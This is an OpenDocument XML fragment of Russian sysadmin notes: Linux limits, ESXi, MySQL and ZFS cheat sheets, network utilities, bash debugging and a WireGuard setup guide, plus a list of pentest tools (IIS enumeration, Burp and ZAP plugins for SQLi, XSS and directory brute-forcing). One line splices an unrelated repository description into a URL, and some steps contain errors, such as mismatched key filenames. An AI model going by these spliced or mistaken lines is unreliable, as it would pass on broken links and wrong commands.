      <text:p text:style-name="P1">- Как разнести значения в одной ячейке по нескольким?</text:p>
      <text:p text:style-name="P17">Например, у вас есть таблица с ФИО визионеров, а вы хотите разнести фамилии, имена и отчества по разным колонкам. Берем первую ячейку - Илон Эрролович Маск - вносим «Илон» в соседнюю ячейку и нажимаем Ctrl+E. Все остальные значения окажутся в столбце.</text:p>
      <text:p text:style-name="P1">- Как сложить данные во всех строках (еще проще, чем вбить формулу в одну ячейку и растянуть на остальные)?</text:p>
      <text:p text:style-name="P7">Зажмите Ctrl, выделите все нужные ячейки, нажмите Alt =.</text:p>
      <text:p text:style-name="P1">Как найти количество открытых файлов в Linux. Значение сохраняется в</text:p>
      <text:p text:style-name="P1"># cat /proc/sys/fs/file-max</text:p>
      <text:p text:style-name="P1">Проверка Hard лимит в Linux</text:p>
      <text:p text:style-name="P1"># ulimit -Hn</text:p>
      <text:p text:style-name="P1">Проверка Soft лимит в Linux</text:p>
      <text:p text:style-name="P1"># ulimit -Sn</text:p>
      <text:p text:style-name="P1">Чтобы просмотреть значения Hard и Soft для разных пользователей, переключите пользователя с «su» на пользователя, ограничения которого вы хотите проверить. Например:</text:p>
      <text:p text:style-name="P1"># su root</text:p>
      <text:p text:style-name="P1">$ ulimit -Sn</text:p>
      <text:p text:style-name="P4">$ ulimit -Hn</text:p>
      <text:p text:style-name="P1">Как проверить количество системных дескрипторов файлов в Linux. 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MySQL / MariaDB или веб-сервер Apache. Вы можете увеличить лимит открытых файлов в Linux, отредактировав опцию ядра fs.file-max. Для этого используйте утилиту sysctl. Sysctl используется для настройки параметров ядра. Например, чтобы увеличить ограничение на количество открых файла до 500000, вы можете использовать следующую команду:</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1">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text:p>
      <text:p text:style-name="P1"># vi /etc/sysctl.conf</text:p>
      <text:p text:style-name="P1">Добавьте следующую команду:</text:p>
      <text:p text:style-name="P1">fs.file-max=500000</text:p>
      <text:p text:style-name="P1">Конечно, вы можете изменить число в соответствии с вашими потребностями. Чтобы снова проверить изменения, используйте:</text:p>
      <text:p text:style-name="P1"># cat /proc/sys/fs/file-max</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">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span></text:p>
      <text:p text:style-name="P13"># sysctl -p</text:p>
      <text:p text:style-name="P13">Установка количества открытых файлов для пользователя в Linux. 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root, вам необходимо отредактировать следующий файл:</text:p>
      <text:p text:style-name="P1"># vi /etc/security/limits.conf</text:p>
      <text:p text:style-name="P1">Если вы администратор Linux,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 Команды, которые вы должны добавить, имеют следующие параметры:</text:p>
      <text:p text:style-name="P1">&lt;domain&gt;        &lt;type&gt;  &lt;item&gt;  &lt;value&gt;</text:p>
      <text:p text:style-name="P1">Вот пример установки Soft и Hard лимитов для пользователя dimo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7">dimon soft nofile 1024</text:p>
      <text:p text:style-name="P1">Список полезных консольных команд VMWare ESXi (в том числе ESXCLI):</text:p>
      <text:p text:style-name="P1">reboot - перезагрузить хост</text:p>
      <text:p text:style-name="P1">poweroff - выключить хост</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">esxcli system version get - </text:span><text:span text:style-name="T3">узнать</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">версию</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">(номер) инсталлированной версии VMware ESXi</text:span></text:p>
      <text:p text:style-name="P1">uname -a - так же узнать версию VMware ESXi</text:p>
      <text:p text:style-name="P1">vmware –vl - и еще один способ узнать версию и релиз VMware ESXi</text:p>
      <text:p text:style-name="P1">esxcli hardware pci list | more - полная информация об установленных PCI устройствах</text:p>
      <text:p text:style-name="P1">lspci - краткая информация обо всех установленных PCI устройствах</text:p>
      <text:p text:style-name="P1">esxtop - диспетчер процессов top для vmware esxi (быстрые клавиши для переключения дисплея: c :cpu, i :interrupt, m :memory, n :network, d :disk adapter, u :disk device, v :disk VM, p :power mgmt)</text:p>
      <text:p text:style-name="P1">vmkerrcode -l - расшифровка кодов ошибок</text:p>
      <text:p text:style-name="P1">esxcfg-nics -l - информация о сетевых картах</text:p>
      <text:p text:style-name="P1">esxcfg-vswitch -l - информация о виртуальных коммутаторах</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">find . -name libstorelib.so - </text:span><text:span text:style-name="T3">найти</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">файл</text:span><text:span text:style-name="T2"> libstorelib.so</text:span></text:p>
      <text:p text:style-name="P1">dcui - работа с консолью сервера через ssh сессию</text:p>
      <text:p text:style-name="P1">chkconfig -l - статус работы демонов</text:p>
      <text:p text:style-name="P1">esxcli hardware memory get - размер установленной памяти</text:p>
      <text:p text:style-name="P1">esxcli software vib list - список установленных vib-пакетов</text:p>
      <text:p text:style-name="P1">esxcli network ip connection list - состояние активных соединений (аналог netstat)</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">esxcli storage vmfs extent list - информация о примонтированных/подключенных томах VMFS</text:span></text:p>
      <text:p text:style-name="P1">esxcli hardware clock (get/set) - отображение/установка времени esxi-хоста</text:p>
      <text:p text:style-name="P1">cd - Смена текущей директории;</text:p>
      <text:p text:style-name="P1">cp - Копирование файла.cp [файл 1] [файл2];</text:p>
      <text:p text:style-name="P1">find - Поиск файлов по критериям;</text:p>
      <text:p text:style-name="P13">ls - Список файлов и директорий в текущей или явно указанной директории.ls /vmfs/volumes/ ключи: -l подробная информация -a отображение скрытых файлов;</text:p>
      <text:p text:style-name="P13">mkdir - Создание директории;</text:p>
      <text:p text:style-name="P1">mv - Перемещение файла. Переименование файла.mv [путь и имя файла] [путь, куда перемещать];</text:p>
      <text:p text:style-name="P1">ps - Информация о запущенных процессах. ps -ef;</text:p>
      <text:p text:style-name="P1">rm - Удаление файлов;</text:p>
      <text:p text:style-name="P1">shutdown - Выключение или перезагрузка сервера shutdown nowshutdown –r now;</text:p>
      <text:p text:style-name="P1">vi - Текстовый редактор;</text:p>
      <text:p text:style-name="P1">nano - Дружелюбный к новичкам текстовый редактор, отсутствует на ESXi;</text:p>
      <text:p text:style-name="P1">cat - Вывод содержимого файла на экран. cat /etc/hosts;</text:p>
      <text:p text:style-name="P1">more - Вывод содержимого файла на экран, по странице за раз. more /etc/hosts;</text:p>
      <text:p text:style-name="P1">man - Справка по командам man &lt;команда, по которой есть вопрос&gt;, для некоторых команд помощь выводится при запуске самой команды без параметров;</text:p>
      <text:p text:style-name="P1">useradd - Создание пользователя. useradd &lt;имя пользователя&gt;;</text:p>
      <text:p text:style-name="P1">passwd - Задание пароля пользователю passwd &lt;имя пользователя&gt;;</text:p>
      <text:p text:style-name="P1">esxcli storage nfs list - список подключеных nfs- хранлилищ на хосте</text:p>
      <text:p text:style-name="P1">esxcli software vib list - cписок установленных vib-пакетов</text:p>
      <text:p text:style-name="P1">esxcli hardware memory get - информация об использовании памяти на хосте ESXi, включая общий объем</text:p>
      <text:p text:style-name="P1">Инструмент перечисления коротких имен файлов IIS:</text:p>
      <text:p text:style-name="P1">Shortscan предназначен для быстрого определения того, какие файлы с короткими именами существуют на веб-сервере IIS. Как только короткое имя файла будет определено, инструмент попытается автоматически определить полное имя файла. https://github.com/bitquark/shortscan</text:p>
      <text:p text:style-name="P1">Расширение Burp Suite запускайте действия и изменяйте форму HTTP-запроса/ответа и трафика WebSocket с помощью настраиваемых правил. https://github.com/synfron/ReshaperForBurp</text:p>
      <text:p text:style-name="P1">Расширение Burp Suite, которое предлагает набор инструментов для тестирования конечных точек GraphQL. https://githubЭтот репозиторий представляет собой набор методов атак, специфичных для SaaS. Он предназначен для исследователей безопасности, красно-синих команд и пентестеров, где они могут узнать о методах атак SaaS и поделиться ими.com/forcesunseen/graphquail</text:p>
      <text:p text:style-name="P3"><text:soft-page-break/><text:span text:style-name="T3">Сборник инструментов/сервисов для каждого компонента конвейера обнаружения и реагирования, а также примеры из реальной практики. Цель - создать справочный центр для разработки эффективных конвейеров обнаружения и реагирования на угрозы. https://github.com/0x4D31/detection-and-response-pipeline</text:span></text:p>
      <text:p text:style-name="P1">https://github.com/nvbn/thefuck - утилита, которая исправляет ошибки в предыдущих консольных командах. Примеры:</text:p>
      <text:p text:style-name="P1">➜ apt-get install vim</text:p>
      <text:p text:style-name="P1">E: Could not open lock file /var/lib/dpkg/lock - open (13: Permission denied)</text:p>
      <text:p text:style-name="P1">E: Unable to lock the administration directory (/var/lib/dpkg/), are you root?</text:p>
      <text:p text:style-name="P1">➜ fuck</text:p>
      <text:p text:style-name="P1">sudo apt-get install vim [enter/↑/↓/ctrl+c]</text:p>
      <text:p text:style-name="P1">[sudo] password for nvbn:</text:p>
      <text:p text:style-name="P1">Reading package lists... Done</text:p>
      <text:p text:style-name="P13">…</text:p>
      <text:p text:style-name="P13">➜ git push</text:p>
      <text:p text:style-name="P1">fatal: The current branch master has no upstream branch.</text:p>
      <text:p text:style-name="P1">To push the current branch and set the remote as upstream, use</text:p>
      <text:p text:style-name="P1">git push --set-upstream origin master</text:p>
      <text:p text:style-name="P1">➜ fuck</text:p>
      <text:p text:style-name="P1">git push --set-upstream origin master [enter/↑/↓/ctrl+c]</text:p>
      <text:p text:style-name="P1">Counting objects: 9, done.</text:p>
      <text:p text:style-name="P1">...</text:p>
      <text:p text:style-name="P1">Установка:</text:p>
      <text:p text:style-name="P1">На Ubuntu / Mint установите The Fuck с помощью следующих команд:</text:p>
      <text:p text:style-name="P1">sudo apt update</text:p>
      <text:p text:style-name="P1">sudo apt install python3-dev python3-pip python3-setuptools</text:p>
      <text:p text:style-name="P1">pip3 install thefuck --user</text:p>
      <text:p text:style-name="P1">На FreeBSD установите The Fuck с помощью следующих команд:</text:p>
      <text:p text:style-name="P1">pkg install thefuck</text:p>
      <text:p text:style-name="P1">На macOS или Linux установить The Fuck можно через Homebrew:</text:p>
      <text:p text:style-name="P4">brew install thefuck</text:p>
      <text:p text:style-name="P1">Шпаргалка основных команд mysql по работе с базой данных и таблицам. Здесь в компактном виде собраны основные команды администрирование сервера MySQL посредством консоли, позволяющие получить информацию о состоянии баз данных, таблиц, просмотреть их структуру:</text:p>
      <text:p text:style-name="P1">SHOW DATABASES; - список баз данных</text:p>
      <text:p text:style-name="P1">SHOW TABLES [FROM db_name]; - список таблиц в базе</text:p>
      <text:p text:style-name="P1">SHOW COLUMNS FROM таблица [FROM db_name]; - список столбцов в таблице</text:p>
      <text:p text:style-name="P1">SHOW CREATE TABLE table_name; - показать структуру таблицы в формате «CREATE TABLE»</text:p>
      <text:p text:style-name="P1">DESC table_name; - узнать полную структуру таблицы</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">SHOW INDEX FROM tbl_name; - список индексов</text:span></text:p>
      <text:p text:style-name="P1">SHOW GRANTS FOR user [FROM db_name]; - привилегии для пользователя.</text:p>
      <text:p text:style-name="P1">SHOW VARIABLES; - значения системных переменных</text:p>
      <text:p text:style-name="P1">SHOW [FULL] PROCESSLIST; - статистика по mysqld процессам</text:p>
      <text:p text:style-name="P1">SHOW STATUS; - общая статистика</text:p>
      <text:p text:style-name="P1">SHOW TABLE STATUS [FROM db_name]; - статистика по всем таблицам в базе</text:p>
      <text:p text:style-name="P1">USE db_name; - использовать базу данных, для которой будут выполнятся дальнейшие запросы</text:p>
      <text:p text:style-name="P1">DELETE FROM table_name; - удалить все записи из таблицы. Сначала нужно выполнить USE db_name;</text:p>
      <text:p text:style-name="P1">SELECT * FROM table_name; - просмотр всех записей из таблицы</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P1">Шпаргалка по ZFS:</text:p>
      <text:p text:style-name="P1">modinfo zfs | head -n 9 - узнать версию ZFS и другие подробности</text:p>
      <text:p text:style-name="P1">Информация о пулах / файловых системах (ФС) на пулах:</text:p>
      <text:p text:style-name="P1">zpool list - статус пулов</text:p>
      <text:p text:style-name="P13">zpool status -v - статус пулов подробный</text:p>
      <text:p text:style-name="P13">zfs list - список ФС, так называются монтируемые разделы в пулах</text:p>
      <text:p text:style-name="P1">zfs get all - вся инфа по пулам, вообще вся</text:p>
      <text:p text:style-name="P1">Управление пулами / дисками:</text:p>
      <text:p text:style-name="P1">ls -lha /dev/disk/by-id/ - выяснить айдишники дисков чтобы потом на них создать пул (будут проблемы если подцепишь по буквенному названию диска типа sda, они динамически меняются)</text:p>
      <text:p text:style-name="P1">zpool create zfspool disk-id-1 disk-id-2 - может быть сколько угодно дисков, с ключом -f форсить создание пула</text:p>
      <text:p text:style-name="P1">zpool create -m /mnt/backups zfspool disk-id-1 - создать пул с указанием папки маунтирования</text:p>
      <text:p text:style-name="P1">zpool destroy zfspool - уничтожить пул zfspool, с ключом -f форсить уничтожение</text:p>
      <text:p text:style-name="P1">mkfile 100m disk1 disk2 - создать файлы дисков</text:p>
      <text:p text:style-name="P1">zpool create backups /disk1 /disk2- создать пул backups на созданных файлах</text:p>
      <text:p text:style-name="P1">zpool create zfspool mirror /disk1 /disk2 - создать пул zfspool с зеркалированием на 2 диска</text:p>
      <text:p text:style-name="P1">zpool add zfspool /disk3 - добавить диск в пул</text:p>
      <text:p text:style-name="P1">zpool attach zfspool /disk3 - добавить устройство в пул, если он в зеркале то станет в зеркало, если простой, то пул расширится</text:p>
      <text:p text:style-name="P1">zpool remove zfspool mirror-1</text:p>
      <text:p text:style-name="P1">zpool detach zfspool /disk3 - исключить устройство из пула</text:p>
      <text:p text:style-name="P1">zpool remove zfspool /disk3 - удаление устройства из пула</text:p>
      <text:p text:style-name="P1">zpool add zfspool spare /disk3 - добавление диска горячей замены в пул</text:p>
      <text:p text:style-name="P1">zpool remove zfspool spare /disk3 - удаление диска горячей замены из пула</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">zpool offline zfspool /disk1 - отключить устройство, на него не будет никакой записи и с него чтения, если добавить ключ -t, то после ребута станет онлайн</text:span></text:p>
      <text:p text:style-name="P1">zpool online zfspool /disk1 - включить disk1</text:p>
      <text:p text:style-name="P1">zpool replace zfspool /disk1 /disk3 - заменить disk 1, например в случае неисправности на disk3</text:p>
      <text:p text:style-name="P1">zpool upgrade -v - увидеть версию, и фичи текущего ZFS, -a обновит все пулы до новейшей версии</text:p>
      <text:p text:style-name="P1">Создание ФС и свойства ФС:</text:p>
      <text:p text:style-name="P1">zfs create zfspool/data - создать ФС data</text:p>
      <text:p text:style-name="P1">zfs create zfspool/backups создать ФС backups, обе ФС будут бесконтрольно расти, пока не выставлены квоты</text:p>
      <text:p text:style-name="P1">zfs destroy -fr zfspool/backups/old - уничтожит ФС old, ключ -r - рекурсивно, если внутри ещё несколько ФС, -f - форсить</text:p>
      <text:p text:style-name="P1">zfs set reservation=1G zfspool/data - зарезервировать 1 Гигабайт, который ФС гарантированно получит, а другие не займут</text:p>
      <text:p text:style-name="P1">zfs list -o quota zfspool/backups - выяснить квоту в пуле на ФС backups</text:p>
      <text:p text:style-name="P1">zfs set quota=1G zfspool/backups - установить квоту в 1 Гигабайт на ФС backups</text:p>
      <text:p text:style-name="P1">zfs list -o compression - проверить включена компрессия или нет</text:p>
      <text:p text:style-name="P1">zfs set compression=on zfspool/backups - включить компрессию на ФС backups в пуле zfspool</text:p>
      <text:p text:style-name="P23">zfs set sharesmb=on zfspool/backups - расшарить по SMB ФС backups средствами ZFS</text:p>
      <text:p text:style-name="P23">zfs set sharenfs=on zfspool/backups - расшарить по NFS ФС backups средствами ZFS</text:p>
      <text:p text:style-name="P1">Маунт:</text:p>
      <text:p text:style-name="P1">zfs mount - отобразить все маунтированные ФС</text:p>
      <text:p text:style-name="P1">zfs mount zfspool/backups - маунт ФС backups</text:p>
      <text:p text:style-name="P1">zfs umount zfspool/backups - анмаунт ФС backups</text:p>
      <text:p text:style-name="P1">zfs mount -a - маунт всех ФС ZFS</text:p>
      <text:p text:style-name="P1">zfs umount -a Umount - анмаунт всех ФС ZFS</text:p>
      <text:p text:style-name="P1">Снапшоты:</text:p>
      <text:p text:style-name="P1">zfs list -t snapshot - отобразить все снапшоты</text:p>
      <text:p text:style-name="P1">zfs list -o space - сколько занимают места снапшоты и конкретные дети пулов</text:p>
      <text:p text:style-name="P1">zfs snapshot zfspool/backups@test - создать снапшот ФС backups с названием test</text:p>
      <text:p text:style-name="P1">zfs rollback zfspool/backups@test - вернуться к снапшоту backups с названием test, с ключом -r рекурсивно уничтожит промежуточные снапшоты, с ключом -f форсит анмаунт и ремаунт</text:p>
      <text:p text:style-name="P1">zfs destroy zfspool/backups@test - уничтожить снапшот backups с названием test</text:p>
      <text:p text:style-name="P1">zfs send zfspool/backups@march2021 &gt; /home/backups/march2021.bak - сделать локальный бекап снапшота march2021</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">zfs receive zfspool2/backups2 &lt; /home/backups/march2021.bak - Восстановить из локального снапшота ФС на другом пуле</text:span></text:p>
      <text:p text:style-name="P1">zfs send zfspool/backups@march2021 | zfs receive zfspool2/backups2 - Комбо предыдущих двух</text:p>
      <text:p text:style-name="P1">zfs send zfspool/backups@march2021 | ssh COMP02 “zfs receive testpool/testfs” - Отправить снапшот по SSH на хост COMP02</text:p>
      <text:p text:style-name="P1">zfs clone zfspool/backups@march2021 /clones/backups - Клонировать существующий снапшот</text:p>
      <text:p text:style-name="P4">zfs destroy zfspool/backups@march2021 - Уничтожить клон</text:p>
      <text:p text:style-name="P1">Векторные базы данных (часть 1): что отличает каждую из них? https://thedataquarry.com/posts/vector-db-1/</text:p>
      <text:p text:style-name="P1">Векторные базы данных (часть 2): понимание их внутреннего устройства https://thedataquarry.com/posts/vector-db-2/</text:p>
      <text:p text:style-name="P1">Векторные базы данных (часть 3): не все индексы одинаковы https://thedataquarry.com/posts/vector-db-3/</text:p>
      <text:p text:style-name="P4">Векторные базы данных (часть 4): анализ компромиссов https://thedataquarry.com/posts/vector-db-4/</text:p>
      <text:p text:style-name="P1">Полезные сетевые утилиты linux:</text:p>
      <text:p text:style-name="P23">ip: Утилита управляет интерфейсами, сетевыми устройствами и туннелями. Всем сетевым стеком linux. Например: ip addr - Покажет список всех сетевых адресов. Тоже самое делает утилита ifconfig без параметров. ip route - Покажет таблицу роутинга. Тоже самое сделает команда route. ip link set eth0 up - Поднимает интерфейс eth0. Это можно также сделать с помощью ifconfig. Так зачем она нужна если все ее команды можно выполнить с помощью других утилит? Дело в том, что во многие компактные дистрибутивы (например Alpine или openwrt) не используют ifconfig, route и другие “большие” утилит. Там оставляют только ip. Вот с помощью нее и придется выполнять все сетевые задачи.</text:p>
      <text:p text:style-name="P23">nc: Полное имя netcat - на него она тоже откликается. Это утилита, позволяет слушать и выполнять TCP и UDP соединении. Открываем одно окно терминала и делаем там nc -l 12345 это будет наш сервер. Отрываем другое окно и пишем в нем nc 127.0.0.1 12345 - это наш клиент. Печатаем там “Hello!” нажимаем enter. В первом окне видим эту фразу. Ура! Мы написали однонаправленный чат. Эта утилита пригодиться чтобы проверить жив ли сервер и слушает ли от вообще на этом порту? С помощью nc можно переслать файл и даже просканировать порты. Http сервер еще можно написать.</text:p>
      <text:p text:style-name="P1">socat: Это труба, которая позволяет соединить два сокета между собой. Mysql слушает только на local socket а мы хотим на его ходить по tcp. Выглядит это так: socat TCP-LISTEN:3307,reuseaddr,fork UNIX-CONNECT:/var/lib/mysql/mysql.sock. Конектор к netcat из предыдущего примера: socat - TCP4:127.0.0.1:80. Если вам нужно перебросить сокет в другое место присмотритесь к socat он вам скорее всего поможет. </text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">netstat: Эта утилита показывает текущее состояние сетевого стека. Она даст вам ответ на вопросы: что у меня там на порту 9081 висит? netstat -nltp Что с моими tcp соединениями и кто прямо сейчас ко мне подключен? netstat -atp. У этой утилиты есть младший (или старший по возможностям) брат ss посмотрите на него тоже может он понравиться больше.</text:span></text:p>
      <text:p text:style-name="P4">curl: Утилита для передачи файлов. Так написано в ее описании. Чем же она замечательна? Она умеет кучу протоколов: DICT, FILE, FTP, FTPS, GOPHER, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, POP3, POP3S, RTMP, RTSP, SCP, SFTP, SMB, SMBS, SMTP, SMTPS, TELNET and TFTP. В каждом протоколе она знает множество версий, например HTTP она может до версии 2. Умеет подставлять хидера, куки, ходить по SSL, использовать proxy разных видов. Можно отлаживать http(s) соединение с помощью -v. Примеры: curl http://artscene.textfiles.com/asciiart/unico; curl -v http://127.0.0.1:12345. Соединяемся с сервером из примера netcat. В консоле сервера увидим http запрос. После этого все остановиться curl будет ждать ответ. И если вы руками его введете покажет его.</text:p>
      <text:p text:style-name="P1">Как отлаживать bash-script-ы по шагам. Волшебная строчка, которую нужно добавить после #!/bin/bash, чтоб скрипт можно было отлаживать по шагам</text:p>
      <text:p text:style-name="P1">#!/bin/bash</text:p>
      <text:p text:style-name="P1">trap 'echo "# $BASH_COMMAND";read' DEBUG</text:p>
      <text:p text:style-name="P1">echo line1</text:p>
      <text:p text:style-name="P1">echo line2</text:p>
      <text:p text:style-name="P1">echo line3</text:p>
      <text:p text:style-name="P1">Процесс отладки: Запускаем скрипт, перед выполнением каждой команды выводится то, что будет исполняться, затем интерпретатор начинает ожидать нажатия клавиши &lt;ENTER&gt;. Если понимаем, что что-то пошло не так, нажимаем Ctrl+C и выходим из отладки. Ингредиенты:</text:p>
      <text:p text:style-name="P1">команда trap, которая умеет перехватывать разные сигналы и в нашем случае она перехватывает сигнал DEBUG, посылаемый перед выполнением команды команда read, которая умеет ожидать ввода чего-нибудь с клавиатуры (в данном случае нам нужно только либо ENTER либо Ctrl+C переменная окружения $BASH_COMMAND, валидная внутри обработчика команды trap.</text:p>
      <text:p text:style-name="P23"># <text:s text:c="28"/>Online Bash Shell.</text:p>
      <text:p text:style-name="P23"># <text:s text:c="16"/>Code, Compile, Run and Debug Bash script online.</text:p>
      <text:p text:style-name="P1"># Write your code in this editor and press "Run" button to execute it.</text:p>
      <text:p text:style-name="P1">trap 'echo "# $BASH_COMMAND";read' DEBUG</text:p>
      <text:p text:style-name="P1">echo line1</text:p>
      <text:p text:style-name="P1">echo line2</text:p>
      <text:p text:style-name="P1">echo line3</text:p>
      <text:p text:style-name="P4">echo "Hello World";</text:p>
      <text:p text:style-name="P1">ТОП-10 <text:s/>плагинов для OWASP ZAP:</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Access Control Testing: <text:s/>(https://www.zaproxy.org/docs/desktop/addons/access-control-testing/)Позволяет (https://www.zaproxy.org/docs/desktop/addons/access-control-testing/) проводить тестирование контроля доступа и выявлять потенциальные проблемы с контролем доступа. </text:span></text:p>
      <text:p text:style-name="P1">Advanced SQLInjection Add-on: <text:s/>(https://www.zaproxy.org/docs/desktop/addons/advanced-sqlinjection-scanner/)Инструмент (https://www.zaproxy.org/docs/desktop/addons/advanced-sqlinjection-scanner/) активного сканирования для обнаружения SQLi (на основе SQLMap).</text:p>
      <text:p text:style-name="P1">Attack Surface Detector: <text:s/>(https://github.com/secdec/attack-surface-detector-zap/wiki)Плагин (https://github.com/secdec/attack-surface-detector-zap/wiki) помогает выявить конечные точки веб-приложения, параметры, которые принимают эти конечные точки, и тип данных этих параметров.</text:p>
      <text:p text:style-name="P1">DOM XSS Active Scan Rule: <text:s/>(https://www.zaproxy.org/docs/desktop/addons/dom-xss-active-scan-rule/)Активный (https://www.zaproxy.org/docs/desktop/addons/dom-xss-active-scan-rule/) сканер для обнаружения уязвимостей DOM XSS.</text:p>
      <text:p text:style-name="P1">Directory List v2.3: <text:s/>(https://www.zaproxy.org/docs/desktop/addons/directory-list-v2.3/)Предоставляет (https://www.zaproxy.org/docs/desktop/addons/directory-list-v2.3/) файлы с именами каталогов для брутфорса или фаззинга.</text:p>
      <text:p text:style-name="P1">Eval Villain: <text:s/>(https://www.zaproxy.org/docs/desktop/addons/eval-villain/)Расширение (https://www.zaproxy.org/docs/desktop/addons/eval-villain/) для ZAP и Firefox, которое будет подключаться к опасным функциям, таким как eval, и предупреждать вас об их использовании.</text:p>
      <text:p text:style-name="P1">GraphQL Support: <text:s/>(https://www.zaproxy.org/docs/desktop/addons/graphql-support/)Плагин (https://www.zaproxy.org/docs/desktop/addons/graphql-support/) для получения структуры и запросов GraphQL.</text:p>
      <text:p text:style-name="P1">Out-of-band Application Security Testing Support: <text:s/>(https://www.zaproxy.org/docs/desktop/addons/oast-support/)Сервер (https://www.zaproxy.org/docs/desktop/addons/oast-support/) OAST для обнаружения внешних и слепых уязвимостей. Аналог Burp Collaborator, только для ZAP.</text:p>
      <text:p text:style-name="P1">HUNT v2: <text:s/>(https://github.com/bugcrowd/HUNT/tree/master/Remix)Выполняет (https://github.com/bugcrowd/HUNT/tree/master/Remix) пассивное сканирование на наличие потенциально уязвимых параметров.</text:p>
      <text:p text:style-name="P1">Community-scripts: (https://github.com/zaproxy/community-scripts) Большая (https://github.com/zaproxy/community-scripts) коллекция скриптов ZAP предоставленная комьюнити</text:p>
      <text:p text:style-name="P17">Как настроить VPN-сервер WireGuard на CentOS: Шаг 1. Установка сервера WireGuard на CentOS</text:p>
      <text:p text:style-name="P1">sudo yum update </text:p>
      <text:p text:style-name="P1">sudo dnf update</text:p>
      <text:p text:style-name="P1">Добавьте репозитории EPEL и Elrepo для установки модулей ядра и инструментов WireGuard.</text:p>
      <text:p text:style-name="P1">sudo dnf install epel-release elrepo-release -y</text:p>
      <text:p text:style-name="P1">Убедимся, что у нас включены репозиторий PowerTools, так как пакеты EPEL могут зависеть от пакетов из него:</text:p>
      <text:p text:style-name="P1">sudo yum install 'dnf-command(config-manager)'</text:p>
      <text:p text:style-name="P1">sudo yum config-manager --set-enabled PowerTools</text:p>
      <text:p text:style-name="P1">Прежде чем мы сможем установить модуль ядра WireGuard, включим его официальный репозиторий:</text:p>
      <text:p text:style-name="P1">sudo yum copr enable jdoss/wireguard</text:p>
      <text:p text:style-name="P1">Теперь установим WireGuard:</text:p>
      <text:p text:style-name="P1">sudo yum install wireguard-dkms wireguard-tools</text:p>
      <text:p text:style-name="P1">Шаг 2. Генерация закрытого и открытого ключей. Перейдите в каталог:</text:p>
      <text:p text:style-name="P1">cd /etc/wireguard</text:p>
      <text:p text:style-name="P1">Установите разрешение на эту директорию:</text:p>
      <text:p text:style-name="P1">umask 077</text:p>
      <text:p text:style-name="P1">Чтобы сгенерировать пару ключей:</text:p>
      <text:p text:style-name="P1">wg genkey | tee private.key | wg pubkey &gt; public.key</text:p>
      <text:p text:style-name="P1">Чтобы просмотреть сгенерированные ключи:</text:p>
      <text:p text:style-name="P1">ls -l privatekey publickey</text:p>
      <text:p text:style-name="P1">sudo cat privatekey</text:p>
      <text:p text:style-name="P1">Обязательно запишите этот ключ, он понадобиться нам далее:</text:p>
      <text:p text:style-name="P1">sudo cat publickey</text:p>
      <text:p text:style-name="P1">Шаг 3. Настройка серверной конфигурации. Чтобы начать настройку сервера WireGuard, перейдите в папку /etc/wireguard и создайте файл wg0.conf</text:p>
      <text:p text:style-name="P1">sudo nano /etc/wireguard/wg0.conf</text:p>
      <text:p text:style-name="P1">Добавьте в файл конфигурации следующие директивы и заполните данные созданными до этого ключами:</text:p>
      <text:p text:style-name="P1">[Interface]</text:p>
      <text:p text:style-name="P1">PrivateKey = &lt;contents-of-server-privatekey&gt;</text:p>
      <text:p text:style-name="P1">Address = 10.0.0.1/24</text:p>
      <text:p text:style-name="P1">PostUp = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</text:p>
      <text:p text:style-name="P1">PostDown = iptables -D FORWARD -i wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE</text:p>
      <text:p text:style-name="P1">ListenPort = 51820</text:p>
      <text:p text:style-name="P1">[Peer]</text:p>
      <text:p text:style-name="P1">PublicKey = &lt;contents-of-client-publickey&gt;</text:p>
      <text:p text:style-name="P1">AllowedIPs = 10.0.0.2/32</text:p>
      <text:p text:style-name="P1">Скопируйте закрытый ключ, который мы сгенерировали ранее, и вставьте его в PrivateKey.</text:p>
      <text:p text:style-name="P17">Аналогично нужно сгенерировать пару ключей для клиента, скопируйте открытый ключ клиента и вставьте его в PublicKey. Чтобы скопировать значение ключа, выполните следующую команду:</text:p>
      <text:p text:style-name="P1">sudo cat /etc/wireguard/public.key</text:p>
      <text:p text:style-name="P1">sudo cat /etc/wireguard/private.key</text:p>
      <text:p text:style-name="P1">Шаг 4. Настройка FireWall:</text:p>
      <text:p text:style-name="P1">sudo firewall-cmd --add-interface=wg0 --zone=internal</text:p>
      <text:p text:style-name="P1">sudo firewall-cmd --permanent --zone=internal --add-masquerade</text:p>
      <text:p text:style-name="P1">Шаг 5. Запуск WireGuard и включение его при загрузке:</text:p>
      <text:p text:style-name="P4">wg-quick up wg0</text:p>
      <text:p text:style-name="P1">Горячие клавиши для работы в терминале Linux. Перемещение по строке:</text:p>
      <text:p text:style-name="P1">← , → или Ctrl + b, Ctrl + f Смещение курсора на один символ левее или правее.</text:p>
      <text:p text:style-name="P1">Ctrl + →, Ctrl + ←</text:p>
      <text:p text:style-name="P1">или</text:p>
      <text:p text:style-name="P1">Alt + b, Alt + f Смещение курсора на одно слово влево или вправо</text:p>
      <text:p text:style-name="P1">Ctrl + a, Home Установить курсор в начало строки</text:p>
      <text:p text:style-name="P1">Ctrl + e, End Установить курсор в конец строки</text:p>
      <text:p text:style-name="P1">Ctrl + xx Переход между двумя последними позициями курсора</text:p>
      <text:p text:style-name="P1">Сочетания клавиш для редактирования строки в терминале. Редактирование строки:</text:p>
      <text:p text:style-name="P1">Tab, Ctr + i Автодополнение команды или пути</text:p>
